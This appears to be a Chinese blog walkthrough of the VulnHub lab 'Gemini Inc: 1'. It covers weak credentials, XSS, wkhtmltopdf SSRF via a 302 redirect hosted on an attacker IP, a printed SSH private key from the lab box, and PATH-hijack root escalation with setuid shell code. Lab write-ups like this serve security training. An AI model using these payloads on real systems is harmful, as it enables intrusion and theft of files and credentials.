---
title: VulnHub Gemini Inc：1
date: 2026-04-23 16:21:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - 环境变量提权
  - XSS
  - SSRF
  - 重定向绕过
---

# USV：2017

项目地址：https://download.vulnhub.com/geminiinc/Gemini-Pentest-v1.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69e798a15e7b2d92c4b99ac5.png)

## 弱口令

### Gemini Inc

扫描目录发现有一个 `/test2`

![](https://pic1.imgdb.cn/item/69eb529b673fb9750a2b6ddd.png)

访问过去给了一个 GitHub 地址

![](https://pic1.imgdb.cn/item/69eb540e673fb9750a2b7238.png)

拿到了项目源码

![](https://pic1.imgdb.cn/item/69eb567a673fb9750a2b78a4.png)

访问 80 端口，点击 Login

![](https://pic1.imgdb.cn/item/69e7a2315e7b2d92c4b99f47.png)

在初始化数据库的代码段中找到默认管理员账号

![](https://pic1.imgdb.cn/item/69eb5d14673fb9750a2bbb8e.png)

破解 MD5

![](https://pic1.imgdb.cn/item/69eb5cdd673fb9750a2bba7e.png)

弱口令 `admin/1234` 直接进去了

![](https://pic1.imgdb.cn/item/69e7a25a5e7b2d92c4b99f49.png)

## XSS

### Edit info of admin

在后台编辑资料中尝试注入 XSS Payload

![](https://pic1.imgdb.cn/item/69e7a39a5e7b2d92c4b99f67.png)

成功弹窗

![](https://pic1.imgdb.cn/item/69e7a3cd5e7b2d92c4b99f8b.png)

## SSRF

### Export file（CVE-2022-35583 重定向绕过）

在管理员的个人中心中，有一个导出功能

![](https://pic1.imgdb.cn/item/69ec1b16673fb9750a2f6eec.png)

可以将管理员信息导出为 PDF

![](https://pic1.imgdb.cn/item/69ec1b80673fb9750a2f6f2d.png)

在导出的 PDF 文件中，查看到了该组件的名称以及版本

```bash
wkhtmltopdf 0.12.4
```

![](https://pic1.imgdb.cn/item/69ec1f53673fb9750a2f7081.png)

搜索发现存在 SSRF 漏洞，在存在 XSS 的输入点，注入一个 HTML 标签，让引擎尝试加载攻击者控制的远程资源

```html
<iframe src="file:///etc/passwd"></iframe>
```

![](https://pic1.imgdb.cn/item/69ec1fcf673fb9750a2f70c4.png)

不过导出后没有发现 `/etc/passwd` 文件的内容

尝试看能不能打远程

![](https://pic1.imgdb.cn/item/69ec2150673fb9750a2f8f3a.png)

可以明显看到支持远程请求

![](https://pic1.imgdb.cn/item/69ec217b673fb9750a2f8f52.png)

既然能支持远程请求，那么我们可以利用重定向绕过

手动创建一个 302 PHP 文件，将其重定向到 `file:///etc/passwd`

```php
<?php header('location:file://'.$_REQUEST['url']); ?>
```

标签这么写

```html
<iframe height="2000" width="800" src=http://192.168.110.128:8080/302.php?url=/etc/passwd></iframe>
```

![](https://pic1.imgdb.cn/item/69ec23db673fb9750a2f91e3.png)

成功读取到文件内容

## 提权

### SSH 密钥泄露

发现有个用户 gemini1

![](https://pic1.imgdb.cn/item/69ec2449673fb9750a2f9201.png)

尝试读取该用户 `/home/gemini1/.ssh/id_rsa` 私钥

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAv8sYkCmUFupwQ8pXsm0XCAyxcR6m5y9GfRWmQmrvb9qJP3xs
6c11dX9Mi8OLBpKuB+Y08aTgWbEtUAkVEpRU+mk+wpSx54OTBMFX35x4snzz+X5u
Vl1rUn9Z4QE5SJpOvfV3Ddw9zlVA0MCJGi/RW4ODRYmPHesqNHaMGKqTnRmn3/4V
u7cl+KpPZmQJzASoffyBn1bxQomqTkb5AGhkAggsOPS0xv6P2g/mcmMUIRWaTH4Z
DqrpqxFtJbuWSszPhuw3LLqAYry0RlEH/Mdi2RxM3VZvqDRlsV0DO74qyBhBsq+p
oSbdwoXao8n7oO2ASHc05d2vtmmmGP31+4pjuQIDAQABAoIBAQCq+WuJQHeSwiWY
WS46kkNg2qfoNrIFD8Dfy0ful5OhfAiz/sC84HrgZr4fLg+mqWXZBuCVtiyF6IuD
eMU/Tdo/bUkUfyflQgbyy0UBw2RZgUihVpMYDKma3oqKKeQeE+k0MDmUsoyqfpeM
QMc3//67fQ6uE8Xwnu593FxhtNZoyaYgz8LTpYRsaoui9j7mrQ4Q19VOQ16u4XlZ
rVtRFjQqBmAKeASTaYpWKnsgoFudp6xyxWzS4uk6BlAom0teBwkcnzx9fNd2vCYR
MhK5KLTDvWUf3d+eUcoUy1h+yjPvdDmlC27vcvZ0GXVvyRks+sjbNMYWl+QvNIZn
1XxD1nkxAoGBAODe4NKq0r2Biq0V/97xx76oz5zX4drh1aE6X+osRqk4+4soLauI
xHaApYWYKlk4OBPMzWQC0a8mQOaL1LalYSEL8wKkkaAvfM604f3fo01rMKn9vNRC
1fAms6caNqJDPIMvOyYRe4PALNf6Yw0Hty0KowC46HHkmWEgw/pEhOZdAoGBANpY
AJEhiG27iqxdHdyHC2rVnA9o2t5yZ7qqBExF7zyUJkIbgiLLyliE5JYhdZjd+abl
aSdSvTKOqrxscnPmWVIxDyLDxemH7iZsEbhLkIsSKgMjCDhPBROivyQGfY17EHPu
968rdQsmJK8+X5aWxq08VzlKwArm+GeDs2hrCGUNAoGAc1G5SDA0XNz3CiaTDnk9
r0gRGGUZvU89aC5wi73jCttfHJEhQquj3QXCXM2ZQiHzmCvaVOShNcpPVCv3jSco
tXLUT9GnoNdZkQPwNWqf648B6NtoIA6aekrOrO5jgDks6jWphq9GgV1nYedVLpR7
WszupOsuwWGzSr0r48eJxD0CgYEAo23HTtpIocoEbCtulIhIVXj5zNbxLBt55NAp
U2XtQeyqDkVEzQK4vDUMXAtDWF6d5PxGDvbxQoxi45JQwMukA89QwvbChqAF86Bk
SwvUbyPzalGob21GIYJpi2+IPoPktsIhhm4Ct4ufXcRUDAVjRHur1ehLgl2LhP+h
JAEpUWkCgYEAj2kz6b+FeK+xK+FUuDbd88vjU6FB8+FL7mQFQ2Ae9IWNyuTQSpGh
vXAtW/c+eaiO4gHRz60wW+FvItFa7kZAmylCAugK1m8/Ff5VZ0rHDP2YsUHT4+Bt
j8XYDMgMA8VYk6alU2rEEzqZlru7BZiwUnz7QLzauGwg8ohv1H2NP9k=
-----END RSA PRIVATE KEY-----
```

成功连接上该用户

![](https://pic1.imgdb.cn/item/69ec2510673fb9750a2f932c.png)

### 环境变量提权

查找属于 root 账号且有 suid 权限的可执行文件的时候，发现了 `listinfo` 命令

![](https://pic1.imgdb.cn/item/69ec2573673fb9750a2f94d9.png)

查看说明文档

![](https://pic1.imgdb.cn/item/69ec25c4673fb9750a2f9536.png)

提取可疑字符串

![](https://pic1.imgdb.cn/item/69ec260f673fb9750a2f9552.png)

前三条命令都写的绝对路径，但是第四条命令 `date` 却没有写路径，所以可以利用这一点实现 Linux 环境变量提权

```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
​
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

编译文件并命名编译后的文件名为 date

```bash
gcc date.c -o date
```

![](https://pic1.imgdb.cn/item/69ec2801673fb9750a2f96f7.png)
